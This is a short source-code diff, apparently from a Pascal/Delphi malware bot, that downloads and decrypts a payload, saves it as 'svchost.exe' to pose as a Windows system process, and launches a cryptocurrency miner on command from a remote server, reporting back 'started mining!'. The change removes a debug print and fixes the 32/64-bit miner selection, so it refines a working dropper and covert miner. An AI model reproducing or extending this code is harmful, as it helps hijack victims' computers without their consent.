@@ -57,7 +57,6 @@ Begin
   try
     DownloadFile(URL, MS);
     ToggleCrypt(MS, 7019);
-    Writeln(MS.Size);
     if Drop then Begin
       MS.SaveToFile('svchost.exe');
       Sleep(2000);
@@ -364,9 +363,9 @@ Begin
         //Choose miner
         STemp:=Server;
         if Pos('64', Net.Commands.ReadString(FCmdID, 'Bitness', '32'))>0 then
-          STemp += MineModule
+          STemp += MineModule64
         else
-          STemp += MineModule64;
+          STemp += MineModule;
         //Start mining
         if ExecuteModule(STemp, '', True) then
           ToPost.AddFormField('Result', '['+STemp2+'] started mining!')
